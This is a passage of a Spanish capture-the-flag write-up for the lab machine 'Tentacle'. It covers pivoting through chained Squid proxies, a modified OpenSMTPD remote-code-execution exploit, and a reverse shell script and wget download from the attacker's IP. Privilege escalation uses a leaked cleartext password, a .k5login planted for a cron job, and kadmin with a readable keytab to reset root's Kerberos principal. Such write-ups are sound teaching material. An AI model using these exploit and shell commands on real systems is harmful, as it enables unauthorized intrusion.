+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/nmap_discover_ports_localhost_first_squid_proxy.png" alt="Puertos abiertos en dicho servidor por la interfaz de localhost."><figcaption>Puertos abiertos en dicho servidor por la interfaz de localhost.</figcaption></figure></p>
+<p>Podemos ver el puerto 464, 749 nuevos.</p>
+<p>Si realizamos un escaneo de scripts y versiones básicas sobre dichos puertos vemos lo siguiente:</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/nmap_service_and_version_localhost_first_squid_proxy.png" alt="Scripts básicos de reconocimiento y versión."><figcaption>Scripts básicos de reconocimiento y versión.</figcaption></figure></p>
+<p>De esos servicios no vamos a conseguir nada, así que seguimos avanzando en nuestra enumeración.</p>
+<h3 id="Intentar-alcanzar-otras-IPs"><a href="#Intentar-alcanzar-otras-IPs" class="headerlink" title="Intentar alcanzar otras IPs"></a>Intentar alcanzar otras IPs</h3><p>Pasamos al segundo objetivo, intentar alcanzar las IPs obtenidas desde el squid proxy.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nmap -sT -Pn -n -v 10.197.243.77</span><br><span class="line">proxychains -q nmap -sT -Pn -n -v 10.197.243.31</span><br></pre></td></tr></table></figure></div>
+
+<p>Bueno, ningún escaneo nos devuelve nada, así que nada se acaba la máquina aquí, gracias por leer el writeup.</p>
+<h3 id="Intentar-alcanzar-otras-IPs-cambiando-al-adaptador-interno"><a href="#Intentar-alcanzar-otras-IPs-cambiando-al-adaptador-interno" class="headerlink" title="Intentar alcanzar otras IPs cambiando al adaptador interno"></a>Intentar alcanzar otras IPs cambiando al adaptador interno</h3><p>Puede que la máquina objetivo a la que nos estamos enfrentando no tenga más dispositivos que podamos ver. Las máquinas pueden tener una tarjeta de red externa y otra interna, nosotros estamos usando la externa y si mandamos el tráfico a través de la interna ¿veremos más máquinas?</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/first_squid_diagram.png" alt="Diagrama de lo que llevamos."><figcaption>Diagrama de lo que llevamos.</figcaption></figure></p>
+<p>Para usar la interfaz interna vamos a añadir a nuestro archivo &#x2F;etc&#x2F;proxychains.conf la siguiente línea:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   3128</span><br></pre></td></tr></table></figure></div>
+
+<p>De momento tendríamos estas dos en este orden:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http    10.10.10.224 3128</span><br><span class="line">http    127.0.0.1 3128</span><br></pre></td></tr></table></figure></div>
+<p>Y checkear que estéis usando <strong>strict_chain</strong> para que se ejecuten los proxies en el orden que indicamos.</p>
+<p>Si realizamos un escaneo ahora con nmap, veremos que si logramos alcanzar la ip 10.197.243.31.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nmap -sT -n -Pn -v 10.197.243.77</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/nmap_ports_second_squid_proxy.png" alt="Escaneo de nmap a proxy.realcorp.htb"><figcaption>Escaneo de nmap a proxy.realcorp.htb</figcaption></figure></p>
+<p>Si considerás que el escaneo va muy lento puedes crearte un script en bash para agilizarlo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65525); <span class="keyword">do</span></span><br><span class="line">	proxychains -q <span class="built_in">timeout</span> 1 bash -c <span class="string">&quot;echo &#x27;&#x27; &gt; /dev/tcp/10.197.243.77/<span class="variable">$port</span>&quot;</span> 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] <span class="variable">$port</span> - OPEN&quot;</span> &amp;</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">wait</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>En cambio la IP 10.197.243.31(wpad.realcorp.htb) no devuelve ningún puerto abierto, así que podemos imaginar que no llegamos o no tiene ningún puerto tcp abierto.</p>
+<p>Bueno, hemos visto que la máquina que podemos ver también tiene el puerto squid proxy abierto, así que podemos añadirlo a nuestro &#x2F;etc&#x2F;proxychains para ver si alcanzamos dicho equipo que nos queda o descubrimos alguno más.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/second_squid_diagram.png" alt="Squid proxy interno encontrado."><figcaption>Squid proxy interno encontrado.</figcaption></figure></p>
+<p>Y intentamos llegar al servidor wpad.realcorp.htb con el script realizado(recomiendo lanzarlo varias veces, puede que no aparezca toda la información necesaria o se salte algún puerto)</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/nmap_wpad_recon_ports.png" alt="Puertos abiertos en el equipo wpad.realcorp.htb."><figcaption>Puertos abiertos en el equipo wpad.realcorp.htb.</figcaption></figure></p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/third_squid_diagram.png" alt="Diagrama con el equipo wpad."><figcaption>Diagrama con el equipo wpad.</figcaption></figure></p>
+<p>Genial, podemos ver que llegamos al servidor. Podemos ver que el puerto 80 esta abierto, http, esto me interesa, para ver el contenido de la página podemos lanzar un simple <strong>curl</strong>.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q curl http://10.197.243.31/</span><br></pre></td></tr></table></figure></div>
+
+<p>Si lo haces al nombre del dominio sale un 403 Forbidden:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q curl http://wpad.realcorp.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>Con la IP aparece una página por defecto de red hat y nginx, en cambio con el dominio vemos que se esta realiando virtual hosting y obtenemos un 403 forbidden, si investigamos más sobre lo que es wpad y acabamos en la página de <a class="link"   target="_blank" rel="noopener" href="https://hacktricks.boitatech.com.br/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks" >hacktricks.boitatech.com.br<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> podemos ver que los clientes para que carguen la configuación automáticamente del proxy acceden por defecto a &#x2F;wpad.dat, así que vamos a probar a hacer un curl de esta ruta.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q curl -s http://wpad.realcorp.htb/wpad.dat | bat -l js</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/wpad_data.png" alt="Contenido del archivo wpad.dat."><figcaption>Contenido del archivo wpad.dat.</figcaption></figure></p>
+<p>Y vemos dos rangos diferentes, el rango que 10.197.243.0 ya lo tenemos(de ahí sale proxy y wpad), en cambio, el rango 10.241.251.0 es nuevo.</p>
+<p>Bien, pues a partir de aquí tenemos dos caminos, la máquina wpad también tenía el puerto 3128 abierto, podemos intentar ver nuevos activos en la nueva subred utilizando la tarjeta de red interna como hemos visto anteriormente.</p>
+<p>O podemos intentar establecer contacto directamente con esta nueva subred.</p>
+<p>Lo primero sería modificar el script anterior para que también detecte hosts y para que sea más rápido haremos que solo vea algunos puertos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> 21 22 25 53 80 88 443 445 8080 8081; <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254); <span class="keyword">do</span></span><br><span class="line">		proxychains -q <span class="built_in">timeout</span> 1 bash -c <span class="string">&quot;echo &#x27;&#x27; &gt; /dev/tcp/10.241.251.<span class="variable">$i</span>/<span class="variable">$port</span>&quot;</span> 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] Port <span class="variable">$port</span> - OPEN on host 10.241.251.<span class="variable">$i</span>&quot;</span> &amp;</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">wait</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Después añadiremos la línea 127.0.0.1 a la configuración de proxychains para ver si podemos enumerar hosts en ese rango desde el adaptador interno.</p>
+<p>Si ejecutamos vemos que nos comememos un mojón y no detecta nada, puedes probar con otros puertos, etc, pero ya te adelanto que no vas a conseguir nada.</p>
+<p>Así que si si quitamos la línea del archivo de configuración de proxychains y lanzamos otra vez el script veremos que nos detecta dos hosts:</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/port_scan_last_network_vulnerable_mail.png" alt="Escaneo de hosts y puertos sobre la nueva subred."><figcaption>Escaneo de hosts y puertos sobre la nueva subred.</figcaption></figure></p>
+<p>Vemos dos máquinas, uan con el puerto 22 y otra con el puerto 25(por defecto smtp, correo).</p>
+<p>La máquina con el puerto 25 abierto me interesa más, así que vamos a lanzar unos scripts básicos de nmap para obtener más información.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nmap -p25 -sCV 10.241.251.113</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/nmap_version_opensmtpd.png" alt="Información extra del servicio que corre en dicho puerto."><figcaption>Información extra del servicio que corre en dicho puerto.</figcaption></figure></p>
+<p>Si utilizamos la herramienta <strong>searchsploit</strong> podemos encontrar que el servicio esta desactualizado y existe un script basntante peligroso e interesante para nosotros. Al disponer de un servicio de una versión menor podríamos probar a ejecutarlo.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/exploit_snmpd_searchsploit.png" alt="Buscamos exploits para el servicio OpenSMTPD."><figcaption>Buscamos exploits para el servicio OpenSMTPD.</figcaption></figure></p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/fourth_squid_diagram.png" alt="Red entera de la máquina."><figcaption>Red entera de la máquina.</figcaption></figure></p>
+<h1 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h1><h2 id="Uso-de-RCE-para-OpenSNMPD"><a href="#Uso-de-RCE-para-OpenSNMPD" class="headerlink" title="Uso de RCE para OpenSNMPD"></a>Uso de RCE para OpenSNMPD</h2><p>Bien, pues ya tenemos el primer exploit a probar sobre una máquina, vamos a inspeccionar el código del script y nos lo descargamos(searchsploit -x &lt;path&gt; para inspeccionar y m &lt;path&gt; para descargar).</p>
+<p>¿Cómo podemos probarlo? Pues bien, nos podemos abrir un servidor en python y intentar enviar una petición http desde el servidor víctima.</p>
+<p>Nos ponemos en escucha con python:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q python3 rce_smtpd.py 10.241.251.113 25 <span class="string">&quot;wget 10.10.14.22&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/first_try_exploit_snmptd_failed.png" alt="Intento fallido del exploit."><figcaption>Intento fallido del exploit.</figcaption></figure></p>
+<p>Vemos que por abajo no ha llegado nada, ¿porque?. Vamos a revisar el código del script.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/original_script_exploit_root_user.png" alt="El usuario que se indica para enviar el correo es root."><figcaption>El usuario que se indica para enviar el correo es root.</figcaption></figure></p>
+<p>Recordemos que al principio, al visualizar la página del primer squid proxy, nos daba un usuario, el usuario “<a class="link"   href="mailto:&#106;&#x2e;&#x6e;&#x61;&#107;&#97;&#x7a;&#x61;&#x77;&#x61;&#x40;&#x72;&#101;&#97;&#x6c;&#x63;&#x6f;&#x72;&#112;&#x2e;&#104;&#116;&#x62;" >&#106;&#x2e;&#x6e;&#x61;&#107;&#97;&#x7a;&#x61;&#x77;&#x61;&#x40;&#x72;&#101;&#97;&#x6c;&#x63;&#x6f;&#x72;&#112;&#x2e;&#104;&#116;&#x62;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“.</p>
+<h3 id="Kerbrute-para-validar-usuarios"><a href="#Kerbrute-para-validar-usuarios" class="headerlink" title="Kerbrute para validar usuarios"></a>Kerbrute para validar usuarios</h3><p>Podemos chekear si el usuario existe gracias al servicio kerberos corriendo en la primera máquina, para ello utilizaremos la herramienta kerbrute:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum --domain realcorp.htb --dc 10.10.10.224 ../data/users.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/kerbrute_user_enum.png" alt="Checkar si el usuario encontrado existe con kerbrute."><figcaption>Checkar si el usuario encontrado existe con kerbrute.</figcaption></figure></p>
+<p>Es más, no solo es que exista, si no también no tiene el pre-auth activado y nos dumpea el hash. Podéis intentar a crackerlo con john o hashcat, pero no vais a obtener la contraseña.</p>
+<h2 id="Modificacion-del-exploit"><a href="#Modificacion-del-exploit" class="headerlink" title="Modificación del exploit"></a>Modificación del exploit</h2><p>Vamos a cambiar el usuario root por este ya que hemos visto que es válido.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/exploit_modified.png" alt="Modificación del script en python."><figcaption>Modificación del script en python.</figcaption></figure></p>
+<p>Si probamos a ejecutar ahora vemos que si llega una conexión, con lo cuál podemos verificar que el exploit funciona.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/exploit_working_well.png" alt="Verificación exitosa del RCE."><figcaption>Verificación exitosa del RCE.</figcaption></figure></p>
+<p>Si pruebas con curl o wget http:&#x2F;&#x2F;… no llegará la petición… Me quedo con la curiosidad de como el equipo resuelve las peticiones para que solo funcione con wget IP.</p>
+<h2 id="Obteniendo-una-shell"><a href="#Obteniendo-una-shell" class="headerlink" title="Obteniendo una shell"></a>Obteniendo una shell</h2><p>Bien, ahora tenemos varias formas de ganar un acceso, podemos intentar enviar una reverse shell directamente, pero he probado de diferentes maneras y no me ha djeado, por lo tanto voy a crear un archivo index.html para descargarlo con wget en un directorio con permisos como &#x2F;tmp o &#x2F;dev&#x2F;shm y ejecutarlo.</p>
+<p>Archivo index.html</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.22/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
+
+<p>Ejecutamos el exploit y nos descargamos la reverse shell en la máquina víctima.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q python3 rce_smtpd.py 10.241.251.113 25 <span class="string">&quot;wget 10.10.14.22 -O /dev/shm/rev.sh&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>En lugar de un servidor en python nos ponemos a la escucha con netcat.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nc -nlvp 80</span><br></pre></td></tr></table></figure></div>
+
+<p>Ejecutamos la reverse shell:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash /dev/shm/rev.sh</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/obtained_rev_shell_snmptd__with_root.png" alt="Obteniendo la reverse shell."><figcaption>Obteniendo la reverse shell.</figcaption></figure></p>
+<h2 id="Tratamiento-de-la-tty"><a href="#Tratamiento-de-la-tty" class="headerlink" title="Tratamiento de la tty"></a>Tratamiento de la tty</h2><p>El tratamiento es como siempre</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset xterm</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">export</span> SHELL=bash</span><br></pre></td></tr></table></figure></div>
+
+<p>Y si vaís a utilizar algún editor como nano, vi… Tenéis que ajustar el tamaño de la terminal:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># En tu consola que tenga el mismo tamaño</span></span><br><span class="line"><span class="built_in">stty</span> size <span class="comment"># saldrán dos valores, filas y columnas.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># En la consola de la víctima</span></span><br><span class="line"><span class="built_in">stty</span> rows x</span><br><span class="line"><span class="built_in">stty</span> columns x</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Escalada-de-privilegios"><a href="#Escalada-de-privilegios" class="headerlink" title="Escalada de privilegios"></a>Escalada de privilegios</h1><p>Si nos vamos al directorio &#x2F;home&#x2F;j.nakazawa podemos ver un archivo oculto llamado <strong>.msmtprc</strong>, en el podemos ver el usuario j.nakazawa y la contraseña en texto claro “sJB}RM&gt;6Z~64_”</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/j_nakazawa_text_clear_credentials.png" alt="Credenciales del usuario j_nakazawa."><figcaption>Credenciales del usuario j_nakazawa.</figcaption></figure></p>
+<p>Somos usuario root sobre esta máquina(smtp.realcorp.htb).</p>
+<p>Si recordarmos, en la primera máquina el servicio ssh estaba habilitado, podemos intentar autenticarnos con dicho usuario, pero vemos que no reconoce la contraseña, pero ¿y si gastamos los tres intentos permitidos que mensaje de error nos aparece?, ¿si utilizamos ssh con la flag <strong>-v</strong> de verbose que podemos ver?</p>
+<p>Bien, pues a mi me llama la atención lo siguiente:</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/ssh_with_nakazawa_error_type.png" alt="Error de ssh al gastar los tres intentos."><figcaption>Error de ssh al gastar los tres intentos.</figcaption></figure><br>Vemos algo raro, algo fuera de lo común, gssapi-keyex… ¿que es esto?. Vamos a buscarlo en internet. En esta entrada de <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Programming_Interface" >wikipedia<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> podemos ver que este mecanismo se utiliza con Kerberos.</p>
+<p>Para utilizar ssh con kerberos como cliente debemos realizar los siguientes pasos:</p>
+<ol>
+<li><p>Checkear si tenemos instalado el paquete <strong>krb5</strong>.</p>
+</li>
+<li><p>Modificar el fichero &#x2F;etc&#x2F;krb5.conf o crearlo si no existe con dpkg-reconfigure krb5-config. Se quedaría así:</p>
+</li>
+</ol>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">	default_realm = REALCORP.HTB</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line"># use &quot;kdc = ...&quot; if realm admins haven&#x27;t put SRV records into DNS</span><br><span class="line">	REALCORP.HTB = &#123;</span><br><span class="line">		kdc = srv01.realcorp.htb</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">	.REALCORP.HTB = REALCORP.HTB</span><br><span class="line">	REALCORP.HTB = REALCORP.HTB</span><br></pre></td></tr></table></figure></div>
+
+
+<ol start="3">
+<li>Generamos un TGT(Ticket Granting Ticket) con la herramienta <strong>kinit</strong>, puedes comprobar si tienes algún ticket antes con <strong>klist</strong>:</li>
+</ol>
+
+  <div class="note p-4 mb-4 rounded-small warning">
+    <p>Estar como superusuario para ejecutar las siguientes tareas para el correcto funcionamiento.</p>
+
+  </div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> kinit j.nakazawa@REALCORP.HTB <span class="comment"># Pones la contraseña: sJB&#125;RM&gt;6Z~64_</span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/kinit_generate_ticket_nakazawa.png" alt="Comprobamos el ticket generado con klist."><figcaption>Comprobamos el ticket generado con klist.</figcaption></figure></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ssh -o GSSAPIAuthentication=<span class="built_in">yes</span> j.nakazawa@srv01.realcorp.htb</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/inside_srv01_server.png" alt="Dentro del servidor principal."><figcaption>Dentro del servidor principal.</figcaption></figure></p>
+<p>Si quieres borrar los tickets puedes utilizar kdestroy.</p>
+<h2 id="j-nakazawa-admin"><a href="#j-nakazawa-admin" class="headerlink" title="j.nakazawa -&gt; admin"></a>j.nakazawa -&gt; admin</h2><p>La flag esta situada en &#x2F;home&#x2F;j.nakazawa&#x2F;user.txt.</p>
+<p>Podemos localizar otro usuario bajo directorio &#x2F;home, pero no tenemos acceso a él. Si listamos las tareas programadas del sistema veremos que existe un script.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/srv01_crontab.png" alt="Crontab del equipo."><figcaption>Crontab del equipo.</figcaption></figure></p>
+<p>Si le echamos un ojo al script vemos que otros tienen capacidad de lectura sobre este.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/content_of_log_backup_script.png" alt="Contenido del script."><figcaption>Contenido del script.</figcaption></figure></p>
+<p>Con rsync envía todos el contenido del directorio &#x2F;var&#x2F;log&#x2F;squid al directorio &#x2F;home&#x2F;admin&#x2F; al home del usuario admin. Después comprime algunos ficheros como access.log y cache.log y los elimina.</p>
+<p>Podemos aprovecharnos de que se esta empleando kerberos para generar un fichero <strong>.k5login</strong> que nos permita indicar los principals que estan autorizados a acceder a ese usuario local.</p>
+<p>Entonces si nos vamos a la ruta “&#x2F;var&#x2F;log&#x2F;squid”, comprobamos los permisos que tenemos sobre él.</p>
+<p>Como estamos en el grupo squid(comando id) podemos acceder y escribir en el directorio, pero no listar.</p>
+<p>Así que accedemos a él y creamos el fichero:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/log/squis</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;j.nakazawa@REALCORP.HTB&#x27;</span> &gt; .k5login</span><br></pre></td></tr></table></figure></div>
+
+<p>Y ahora si intentamos conectarnos por ssh.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ssh -o GSSAPIAuthentication=<span class="built_in">yes</span> admin@srv01.realcorp.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>Esto funciona gracias al TGT creado anteriormente como el usuario j.nakazawa, el cuál tiene permiso para acceder como admin gracias al fichero .k5login añadido gracias a la tarea cron.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/enter_with_admin_via_ssh_kerberos.png" alt="Entramos como el usuario admin."><figcaption>Entramos como el usuario admin.</figcaption></figure></p>
+<h2 id="admin-root"><a href="#admin-root" class="headerlink" title="admin -&gt; root"></a>admin -&gt; root</h2><p>Vemos que estamos en el grupo admin con el comando id.<br>Y si buscamos ficheros que tengan el grupo admin:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -broup admin 2&gt;/dev/null | grep -vE <span class="string">&quot;proc|cgroup&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Encontramos el siguiente fichero sospechoso “&#x2F;etc&#x2F;krb5.keytab”. Este fichero se utiliza para autenticar a los usuarios ante el KDC. Este fichero solo debe tener acceso el usario root, pero nosotros como admin también podemos leerlo(aunque sea un binario).</p>
+<p>Entonces vamos a ver las herramientas de kerberos, tenemos <strong>ksu</strong> que nos sirve para obtener privilegios como root normalmente, si la usamos nos pide la contraseña de root y no la tenemos, ni tampoco un ticket, así que cancelamos.</p>
+<p>Tenemos el comando klist para ver los tickets, pero no nos deja ejecutarlo, pero el comando klist <strong>nos permite pasar un keytab y ver los principals almecandos en él</strong>.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/klist_with_krb5_ketab.png" alt="Lista de principals en el keytab."><figcaption>Lista de principals en el keytab.</figcaption></figure></p>
+<p>Podemos utilizar la herramienta <strong>kadmin</strong> que nos sirve para administrar el servidor de kerberos</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB</span><br></pre></td></tr></table></figure></div>
+
+<p>Y entramos a una consola interactiva, si usamos el caracter <strong>?</strong> podremos ver los comandos a ejecutar.</p>
+<p>Entre ellas vemos la opción de <strong>add_principal&#x2F;add_princ</strong>. ¿Entonces si añadimos el principal de root? ¿Podremos resetear la contraseña?</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addprinc root@REALCORP.HTB</span><br></pre></td></tr></table></figure></div>
+
+<p>Efectivamente, sobreescribimos el principal root con este nuevo que nos estamos creando.<br><figure class="image-caption"><img src="/2025/06/12/Tentacle/creat_principal_root_with_kadmin.png" alt="Creación de principal root con nueva contraseña."><figcaption>Creación de principal root con nueva contraseña.</figcaption></figure></p>
+<p>Si volvemos a ejecutar ksu y introducimos la misma contraseña.</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/ksu_with_root_obtaining_flag.png" alt="Utilizando ksu para entrar como root y mostrar la flag."><figcaption>Utilizando ksu para entrar como root y mostrar la flag.</figcaption></figure></p>
+<h1 id="Fuentes"><a href="#Fuentes" class="headerlink" title="Fuentes"></a>Fuentes</h1><p>Basado en el write-up de <a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=hFIWuWVIDek&t=3300s" >s4vitar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ctf/">#ctf</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/linux/">#linux</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/eCPPTv2/">#eCPPTv2</a>&nbsp;
